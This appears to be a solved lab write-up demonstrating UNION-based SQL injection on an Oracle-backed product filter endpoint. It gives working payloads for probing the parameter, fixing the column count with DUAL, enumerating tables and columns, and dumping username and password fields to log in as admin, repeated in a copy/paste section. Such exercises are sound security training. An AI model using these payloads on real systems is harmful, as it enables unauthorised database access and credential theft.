# SQL injection attack, listing the database contents on Oracle

A concise write-up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**Get admin credentials from the database** (Oracle) via UNION-based SQLi.

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: get admin creds from database**

2. **We knows the database is oracle, lets make some research. (what we did in prev lab on mysql, now on oracle)**

3. **see pictures 1,2, we found the queries. lets found the vulnerable parameter endpoint.**

4. **`/filter?category=Food+%26+Drink'` -> error 500**

5. **`/filter?category=Food+%26+Drink'--;` -> fixed**

6. **lets add union for oracle -> `'+UNION+SELECT+NULL,NULL+FROM+DUAL--;` (requires two params)**

7. **getting table names: `'+UNION+SELECT+table_name,NULL+FROM+all_tables--;`  -> our table: `USERS_PHBAAE`**

8. **getting all columns from that table: `'+UNION+SELECT+column_name,NULL+FROM+USER_TAB_COLUMNS+WHERE+table_name='USERS_PHBAAE'--;`**

9. **we fetched two columns lets get their contents: `'+UNION+SELECT+USERNAME_YULFTB,PASSWORD_XDLYEB+FROM+USERS_PHBAAE--;`**

10. **Log in**

11. **Lab solved.**

---

## 🧠 Minimal Additions (Why / Tips)

- **DUAL usage (Oracle):** Use `FROM DUAL` only when selecting **constants** (e.g., `NULL,NULL`). When selecting from real views/tables like `ALL_TABLES` or `USER_TAB_COLUMNS`, you **don’t** add `DUAL`.
- **UNION rules:** The injected `UNION SELECT` must match the **number of columns** (and compatible data types) of the original query. Step 6 sets the count to **2**, which matches later payloads.
- **Which data dictionary view?**  
  - **`ALL_TABLES`** lists tables you have access to (across schemas).  
  - **`USER_TAB_COLUMNS`** lists columns for tables **owned by your current user**. If the target is in another schema, use `ALL_TAB_COLUMNS` and filter on `owner`:
    ```sql
    SELECT column_name
    FROM all_tab_columns
    WHERE table_name = 'USERS_PHBAAE'
      AND owner = '<OWNER_NAME>';
    ```
- **Case / quoting:** Unquoted Oracle identifiers are stored **UPPERCASE**. Your `WHERE table_name='USERS_PHBAAE'` is correct (upper). If you see mixed-case names created with quotes, match them exactly.
- **Commenting remainder:** `--` comments to end-of-line. The `--+` adds a space (since `+` decodes to a space), which makes the comment effective in many labs.
- **URL encoding:** `%26` is the encoded `&` in `Food+%26+Drink`. `+` usually means a space in query strings.

---

## 🔧 Payloads I Used (Copy/Paste)

**Discovery & Fix:**
```txt
/filter?category=Food+%26+Drink'
/filter?category=Food+%26+Drink'--;
```

**Set column count to two (constants need DUAL):**
```txt
/filter?category='+UNION+SELECT+NULL,NULL+FROM+DUAL--;
```

**List tables (2-column UNION):**
```txt
/filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables--;
```

**List columns in target table (current user owns it):**
```txt
/filter?category='+UNION+SELECT+column_name,NULL+FROM+USER_TAB_COLUMNS+WHERE+table_name='USERS_PHBAAE'--;
```

**Dump candidate creds (adjust order if UI renders second col):**
```txt
/filter?category='+UNION+SELECT+USERNAME_YULFTB,PASSWORD_XDLYEB+FROM+USERS_PHBAAE--;
```

---

## 🏁 Result
- Enumerated tables and columns in Oracle, extracted the credential fields, and **logged in as admin**. **Lab Solved. ✅**
